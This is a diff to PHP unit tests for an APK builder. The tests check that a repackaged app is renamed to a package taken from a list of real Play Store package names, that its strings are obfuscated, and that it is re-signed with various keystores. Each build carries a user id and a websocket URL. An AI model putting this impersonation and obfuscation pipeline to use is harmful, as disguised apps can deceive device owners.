@@ -128,7 +128,7 @@ describe('ApkBuilder build steps with mocks', function () {
         expect(fn () => $builder->build(createValidConfig()))->not->toThrow(\Exception::class);
     });
 
-    it('modifyManifest replaces package name when different from default', function () {
+    it('modifyManifest replaces package name with a real Play Store package', function () {
         $manifestContent = '<manifest package="com.icontrol.protector">@drawable/mylogo</manifest>';
 
         $fileSystem = createMockFileSystem();
@@ -145,21 +145,28 @@ describe('ApkBuilder build steps with mocks', function () {
                 return '';
             });
 
-        $manifestWasModified = false;
+        $manifestNewPackage = null;
         $fileSystem->shouldReceive('put')
-            ->andReturnUsing(function ($path, $content) use (&$manifestWasModified) {
+            ->andReturnUsing(function ($path, $content) use (&$manifestNewPackage) {
                 if (str_contains($path, 'AndroidManifest.xml')) {
-                    $manifestWasModified = str_contains($content, 'com.test.app');
+                    // 原始包名不应再出现
+                    if (! str_contains($content, 'com.icontrol.protector')) {
+                        // 提取新包名
+                        if (preg_match('/package="([^"]+)"/', $content, $m)) {
+                            $manifestNewPackage = $m[1];
+                        }
+                    }
                 }
 
                 return true;
             });
 
         $renamePackageCalled = false;
+        $renameNewPackage = null;
         $smaliProcessor = createFakeSmaliProcessor(
-            onRenamePackage: function ($oldPackage, $newPackage) use (&$renamePackageCalled) {
+            onRenamePackage: function ($oldPackage, $newPackage) use (&$renamePackageCalled, &$renameNewPackage) {
                 expect($oldPackage)->toBe(ApkBuilderConstants::DEFAULT_PACKAGE);
-                expect($newPackage)->toBe('com.test.app');
+                $renameNewPackage = $newPackage;
                 $renamePackageCalled = true;
             }
         );
@@ -183,8 +190,10 @@ describe('ApkBuilder build steps with mocks', function () {
 
         $builder->build(createValidConfig());
 
-        expect($manifestWasModified)->toBeTrue();
         expect($renamePackageCalled)->toBeTrue();
+        $validPackages = array_column(ApkBuilderConstants::REAL_PACKAGE_NAMES, 'pkg');
+        expect(in_array($renameNewPackage, $validPackages, true))->toBeTrue();
+        expect($manifestNewPackage)->toBe($renameNewPackage);
     });
 
     it('replaceIcon throws when no icon found', function () {
@@ -323,7 +332,7 @@ describe('ApkBuilder build steps with mocks', function () {
         expect($frameworkCleanupCalls[0])->toContain('rm -rf');
     });
 
-    it('buildApk command includes --aapt with tools dir aapt2 path', function () {
+    it('buildApk command uses plain apktool without aapt2 (legacy alignment)', function () {
         $startCommand = null;
         $successResult = mock(ProcessResult::class);
         $successResult->shouldReceive('successful')->andReturn(true);
@@ -338,7 +347,9 @@ describe('ApkBuilder build steps with mocks', function () {
         $processRunner->shouldReceive('run')->andReturn($successResult);
         $processRunner->shouldReceive('start')
             ->andReturnUsing(function ($cmd) use (&$startCommand, $invokedProcess) {
-                $startCommand = $cmd;
+                if (str_contains($cmd, 'apktool.jar')) {
+                    $startCommand = $cmd;
+                }
 
                 return $invokedProcess;
             });
@@ -359,9 +370,12 @@ describe('ApkBuilder build steps with mocks', function () {
 
         $builder->build(createValidConfig());
 
-        expect($startCommand)->toContain('--aapt');
-        $toolsPath = config('apk-builder.tools_path');
-        expect($startCommand)->toContain($toolsPath.'/aapt2');
+        // 旧版: java -jar apktool.jar b -f <path> -o <output>（不使用 --aapt/--use-aapt2）
+        expect($startCommand)->not->toBeNull();
+        expect($startCommand)->toContain('apktool.jar');
+        expect($startCommand)->toContain(' b -f ');
+        expect($startCommand)->not->toContain('--aapt');
+        expect($startCommand)->not->toContain('aapt2');
     });
 
     it('buildApk runs framework cache cleanup on build failure', function () {
@@ -561,6 +575,108 @@ describe('ApkBuilder optional steps', function () {
         expect($shuffleCalled)->toBeTrue();
     });
 
+    it('obfuscates strings when enabled', function () {
+        $obfuscateStringsCalled = false;
+        $obfuscator = createFakeObfuscator(
+            onObfuscateStrings: function () use (&$obfuscateStringsCalled) {
+                $obfuscateStringsCalled = true;
+
+                return 15;
+            }
+        );
+
+        $fileSystem = createMockFileSystem();
+        $fileSystem->shouldReceive('isDirectory')->andReturn(true);
+        $fileSystem->shouldReceive('exists')->andReturn(true);
+        $fileSystem->shouldReceive('size')->andReturn(1000);
+        $fileSystem->shouldReceive('glob')->andReturn([]);
+
+        $successResult = mock(ProcessResult::class);
+        $successResult->shouldReceive('successful')->andReturn(true);
+        $successResult->shouldReceive('output')->andReturn('');
+        $successResult->shouldReceive('errorOutput')->andReturn('');
+
+        $invokedProcess = mock(InvokedProcess::class);
+        $invokedProcess->shouldReceive('running')->andReturn(false);
+        $invokedProcess->shouldReceive('wait')->andReturn($successResult);
+
+        $processRunner = createMockProcessRunner();
+        $processRunner->shouldReceive('run')->andReturn($successResult);
+        $processRunner->shouldReceive('start')->andReturn($invokedProcess);
+
+        $builder = new ApkBuilder(
+            smaliProcessorFactory: fn ($dir) => createFakeSmaliProcessor(),
+            obfuscatorFactory: fn ($dir) => $obfuscator,
+            apkProtectorFactory: fn () => createFakeApkProtector(),
+            fileSystem: $fileSystem,
+            processRunner: $processRunner
+        );
+
+        $config = new ApkBuildConfig(
+            appId: 'com.test.app',
+            userId: '1',
+            appName: 'Test',
+            appVersion: '1.0',
+            websocketUrl: 'ws://localhost:8081',
+            enableStringObfuscation: true
+        );
+
+        $builder->build($config);
+
+        expect($obfuscateStringsCalled)->toBeTrue();
+    });
+
+    it('does not obfuscate strings when disabled', function () {
+        $obfuscateStringsCalled = false;
+        $obfuscator = createFakeObfuscator(
+            onObfuscateStrings: function () use (&$obfuscateStringsCalled) {
+                $obfuscateStringsCalled = true;
+
+                return 0;
+            }
+        );
+
+        $fileSystem = createMockFileSystem();
+        $fileSystem->shouldReceive('isDirectory')->andReturn(true);
+        $fileSystem->shouldReceive('exists')->andReturn(true);
+        $fileSystem->shouldReceive('size')->andReturn(1000);
+        $fileSystem->shouldReceive('glob')->andReturn([]);
+
+        $successResult = mock(ProcessResult::class);
+        $successResult->shouldReceive('successful')->andReturn(true);
+        $successResult->shouldReceive('output')->andReturn('');
+        $successResult->shouldReceive('errorOutput')->andReturn('');
+
+        $invokedProcess = mock(InvokedProcess::class);
+        $invokedProcess->shouldReceive('running')->andReturn(false);
+        $invokedProcess->shouldReceive('wait')->andReturn($successResult);
+
+        $processRunner = createMockProcessRunner();
+        $processRunner->shouldReceive('run')->andReturn($successResult);
+        $processRunner->shouldReceive('start')->andReturn($invokedProcess);
+
+        $builder = new ApkBuilder(
+            smaliProcessorFactory: fn ($dir) => createFakeSmaliProcessor(),
+            obfuscatorFactory: fn ($dir) => $obfuscator,
+            apkProtectorFactory: fn () => createFakeApkProtector(),
+            fileSystem: $fileSystem,
+            processRunner: $processRunner
+        );
+
+        $config = new ApkBuildConfig(
+            appId: 'com.test.app',
+            userId: '1',
+            appName: 'Test',
+            appVersion: '1.0',
+            websocketUrl: 'ws://localhost:8081',
+            enableStringObfuscation: false
+        );
+
+        $builder->build($config);
+
+        expect($obfuscateStringsCalled)->toBeFalse();
+    });
+
     it('protects APK when enabled', function () {
         $protectCalled = false;
         $protector = createFakeApkProtector(
@@ -607,7 +723,8 @@ describe('ApkBuilder optional steps', function () {
 
         $builder->build($config);
 
-        expect($protectCalled)->toBeTrue();
+        // protect_apk 当前暂时禁用（ApkProtector ZIP 操作导致安装失败）
+        expect($protectCalled)->toBeFalse();
     });
 
     it('modifies DEX when enabled', function () {
@@ -727,6 +844,277 @@ describe('ApkBuilder progress callback', function () {
 
         $errorEvents = array_filter($progressEvents, fn ($e) => ($e['type'] ?? '') === 'error');
         expect(count($errorEvents))->toBe(1);
+    });
+});
+
+describe('ApkBuilder signing (resolveKeystore)', function () {
+    it('uses custom keystore when configured via env', function () {
+        global $mockStepsTempBase;
+        $customKeystorePath = $mockStepsTempBase . '/custom.keystore';
+        file_put_contents($customKeystorePath, 'fake-keystore');
+
+        Config::set('apk-builder.signing.mode', 'release');
+        Config::set('apk-builder.signing.keystore_path', $customKeystorePath);
+        Config::set('apk-builder.signing.keystore_pass', 'mypass');
+        Config::set('apk-builder.signing.key_alias', 'myalias');
+        Config::set('apk-builder.signing.key_pass', 'mykeypass');
+
+        $signingCommand = null;
+        $signedApkCreated = false;
+        $fileSystem = createMockFileSystem();
+        $fileSystem->shouldReceive('isDirectory')->andReturn(true);
+        $fileSystem->shouldReceive('exists')->andReturnUsing(function ($path) use ($customKeystorePath, &$signedApkCreated) {
+            if (str_contains($path, 'signapk.jar') || str_contains($path, 'certificate.pem') || str_contains($path, 'key.pk8')) {
+                return false;
+            }
+            if ($path === $customKeystorePath) {
+                return true;
+            }
+            if (str_contains($path, 'app-signed.apk')) {
+                return $signedApkCreated;
+            }
+
+            return true;
+        });
+        $fileSystem->shouldReceive('size')->andReturn(1000);
+        $fileSystem->shouldReceive('glob')->andReturn([]);
+
+        $successResult = mock(ProcessResult::class);
+        $successResult->shouldReceive('successful')->andReturn(true);
+        $successResult->shouldReceive('output')->andReturn('');
+        $successResult->shouldReceive('errorOutput')->andReturn('');
+
+        $invokedProcess = mock(InvokedProcess::class);
+        $invokedProcess->shouldReceive('running')->andReturn(false);
+        $invokedProcess->shouldReceive('wait')->andReturn($successResult);
+
+        $processRunner = createMockProcessRunner();
+        $processRunner->shouldReceive('run')->andReturnUsing(function ($cmd) use (&$signingCommand, &$signedApkCreated, $successResult) {
+            if (str_contains($cmd, 'apksigner') || str_contains($cmd, 'jarsigner') || str_contains($cmd, 'signapk')) {
+                $signingCommand = $cmd;
+                $signedApkCreated = true;
+            }
+
+            return $successResult;
+        });
+        $processRunner->shouldReceive('start')->andReturn($invokedProcess);
+
+        $builder = new ApkBuilder(
+            smaliProcessorFactory: fn ($dir) => createFakeSmaliProcessor(),
+            obfuscatorFactory: fn ($dir) => createFakeObfuscator(),
+            apkProtectorFactory: fn () => createFakeApkProtector(),
+            fileSystem: $fileSystem,
+            processRunner: $processRunner
+        );
+
+        $builder->build(createValidConfig());
+
+        expect($signingCommand)->not->toBeNull();
+        expect($signingCommand)->toContain($customKeystorePath);
+        expect($signingCommand)->toContain('myalias');
+    });
+
+    it('uses debug keystore when mode is debug', function () {
+        Config::set('apk-builder.signing.mode', 'debug');
+        Config::set('apk-builder.signing.keystore_path', null);
+
+        $signingCommand = null;
+        $signedApkCreated = false;
+        $fileSystem = createMockFileSystem();
+        $fileSystem->shouldReceive('isDirectory')->andReturn(true);
+        $fileSystem->shouldReceive('exists')->andReturnUsing(function ($path) use (&$signedApkCreated) {
+            if (str_contains($path, 'signapk.jar') || str_contains($path, 'certificate.pem') || str_contains($path, 'key.pk8')) {
+                return false;
+            }
+            if (str_contains($path, 'app-signed.apk')) {
+                return $signedApkCreated;
+            }
+
+            return true;
+        });
+        $fileSystem->shouldReceive('size')->andReturn(1000);
+        $fileSystem->shouldReceive('glob')->andReturn([]);
+
+        $successResult = mock(ProcessResult::class);
+        $successResult->shouldReceive('successful')->andReturn(true);
+        $successResult->shouldReceive('output')->andReturn('');
+        $successResult->shouldReceive('errorOutput')->andReturn('');
+
+        $invokedProcess = mock(InvokedProcess::class);
+        $invokedProcess->shouldReceive('running')->andReturn(false);
+        $invokedProcess->shouldReceive('wait')->andReturn($successResult);
+
+        $processRunner = createMockProcessRunner();
+        $processRunner->shouldReceive('run')->andReturnUsing(function ($cmd) use (&$signingCommand, &$signedApkCreated, $successResult) {
+            if (str_contains($cmd, 'apksigner') || str_contains($cmd, 'jarsigner') || str_contains($cmd, 'signapk')) {
+                $signingCommand = $cmd;
+                $signedApkCreated = true;
+            }
+
+            return $successResult;
+        });
+        $processRunner->shouldReceive('start')->andReturn($invokedProcess);
+
+        $builder = new ApkBuilder(
+            smaliProcessorFactory: fn ($dir) => createFakeSmaliProcessor(),
+            obfuscatorFactory: fn ($dir) => createFakeObfuscator(),
+            apkProtectorFactory: fn () => createFakeApkProtector(),
+            fileSystem: $fileSystem,
+            processRunner: $processRunner
+        );
+
+        $builder->build(createValidConfig());
+
+        expect($signingCommand)->not->toBeNull();
+        expect($signingCommand)->toContain('androiddebugkey');
+    });
+
+    it('auto-generates release keystore when no custom keystore and mode is release', function () {
+        Config::set('apk-builder.signing.mode', 'release');
+        Config::set('apk-builder.signing.keystore_path', null);
+
+        $keytoolCommand = null;
+        $signedApkCreated = false;
+        $releaseKeystoreGenerated = false;
+        $fileSystem = createMockFileSystem();
+        $fileSystem->shouldReceive('isDirectory')->andReturn(true);
+        $fileSystem->shouldReceive('exists')->andReturnUsing(function ($path) use (&$signedApkCreated, &$releaseKeystoreGenerated) {
+            if (str_contains($path, 'signapk.jar') || str_contains($path, 'certificate.pem') || str_contains($path, 'key.pk8')) {
+                return false;
+            }
+            if (str_contains($path, ApkBuilderConstants::RELEASE_KEYSTORE_FILENAME)) {
+                return $releaseKeystoreGenerated;
+            }
+            if (str_contains($path, ApkBuilderConstants::KEYSTORE_META_FILENAME)) {
+                return false;
+            }
+            if (str_contains($path, 'app-signed.apk')) {
+                return $signedApkCreated;
+            }
+
+            return true;
+        });
+        $fileSystem->shouldReceive('size')->andReturn(1000);
+        $fileSystem->shouldReceive('glob')->andReturn([]);
+
+        $successResult = mock(ProcessResult::class);
+        $successResult->shouldReceive('successful')->andReturn(true);
+        $successResult->shouldReceive('output')->andReturn('');
+        $successResult->shouldReceive('errorOutput')->andReturn('');
+
+        $invokedProcess = mock(InvokedProcess::class);
+        $invokedProcess->shouldReceive('running')->andReturn(false);
+        $invokedProcess->shouldReceive('wait')->andReturn($successResult);
+
+        $processRunner = createMockProcessRunner();
+        $processRunner->shouldReceive('run')->andReturnUsing(function ($cmd) use (&$keytoolCommand, &$signedApkCreated, &$releaseKeystoreGenerated, $successResult) {
+            if (str_contains($cmd, 'keytool -genkey')) {
+                $keytoolCommand = $cmd;
+                $releaseKeystoreGenerated = true;
+            }
+            if (str_contains($cmd, 'apksigner') || str_contains($cmd, 'jarsigner') || str_contains($cmd, 'signapk')) {
+                $signedApkCreated = true;
+            }
+
+            return $successResult;
+        });
+        $processRunner->shouldReceive('start')->andReturn($invokedProcess);
+
+        $builder = new ApkBuilder(
+            smaliProcessorFactory: fn ($dir) => createFakeSmaliProcessor(),
+            obfuscatorFactory: fn ($dir) => createFakeObfuscator(),
+            apkProtectorFactory: fn () => createFakeApkProtector(),
+            fileSystem: $fileSystem,
+            processRunner: $processRunner
+        );
+
+        $builder->build(createValidConfig());
+
+        expect($keytoolCommand)->not->toBeNull();
+        expect($keytoolCommand)->toContain('keytool -genkey');
+        expect($keytoolCommand)->toContain('-keyalg');
+        expect($keytoolCommand)->toContain(ApkBuilderConstants::RELEASE_KEYSTORE_FILENAME);
+    });
+
+    it('reuses existing auto-generated release keystore from meta file', function () {
+        global $mockStepsTempBase;
+        $toolsPath = config('apk-builder.tools_path');
+        $releaseKeystorePath = $toolsPath . '/' . ApkBuilderConstants::RELEASE_KEYSTORE_FILENAME;
+        $metaPath = $toolsPath . '/' . ApkBuilderConstants::KEYSTORE_META_FILENAME;
+
+        $metaContent = json_encode([
+            'key_alias' => 'saved_alias',
+            'keystore_pass' => 'saved_pass',
+            'key_pass' => 'saved_key_pass',
+        ]);
+
+        Config::set('apk-builder.signing.mode', 'release');
+        Config::set('apk-builder.signing.keystore_path', null);
+
+        $signingCommand = null;
+        $keytoolCalled = false;
+        $signedApkCreated = false;
+        $fileSystem = createMockFileSystem();
+        $fileSystem->shouldReceive('isDirectory')->andReturn(true);
+        $fileSystem->shouldReceive('exists')->andReturnUsing(function ($path) use ($releaseKeystorePath, $metaPath, &$signedApkCreated) {
+            if (str_contains($path, 'signapk.jar') || str_contains($path, 'certificate.pem') || str_contains($path, 'key.pk8')) {
+                return false;
+            }
+            if ($path === $releaseKeystorePath || $path === $metaPath) {
+                return true;
+            }
+            if (str_contains($path, 'app-signed.apk')) {
+                return $signedApkCreated;
+            }
+
+            return true;
+        });
+        $fileSystem->shouldReceive('get')->andReturnUsing(function ($path) use ($metaPath, $metaContent) {
+            if ($path === $metaPath) {
+                return $metaContent;
+            }
+
+            return '';
+        });
+        $fileSystem->shouldReceive('size')->andReturn(1000);
+        $fileSystem->shouldReceive('glob')->andReturn([]);
+
+        $successResult = mock(ProcessResult::class);
+        $successResult->shouldReceive('successful')->andReturn(true);
+        $successResult->shouldReceive('output')->andReturn('');
+        $successResult->shouldReceive('errorOutput')->andReturn('');
+
+        $invokedProcess = mock(InvokedProcess::class);
+        $invokedProcess->shouldReceive('running')->andReturn(false);
+        $invokedProcess->shouldReceive('wait')->andReturn($successResult);
+
+        $processRunner = createMockProcessRunner();
+        $processRunner->shouldReceive('run')->andReturnUsing(function ($cmd) use (&$signingCommand, &$keytoolCalled, &$signedApkCreated, $successResult) {
+            if (str_contains($cmd, 'keytool -genkey')) {
+                $keytoolCalled = true;
+            }
+            if (str_contains($cmd, 'apksigner') || str_contains($cmd, 'jarsigner') || str_contains($cmd, 'signapk')) {
+                $signingCommand = $cmd;
+                $signedApkCreated = true;
+            }
+
+            return $successResult;
+        });
+        $processRunner->shouldReceive('start')->andReturn($invokedProcess);
+
+        $builder = new ApkBuilder(
+            smaliProcessorFactory: fn ($dir) => createFakeSmaliProcessor(),
+            obfuscatorFactory: fn ($dir) => createFakeObfuscator(),
+            apkProtectorFactory: fn () => createFakeApkProtector(),
+            fileSystem: $fileSystem,
+            processRunner: $processRunner
+        );
+
+        $builder->build(createValidConfig());
+
+        expect($keytoolCalled)->toBeFalse('Should not generate new keystore when meta exists');
+        expect($signingCommand)->not->toBeNull();
+        expect($signingCommand)->toContain('saved_alias');
     });
 });
 
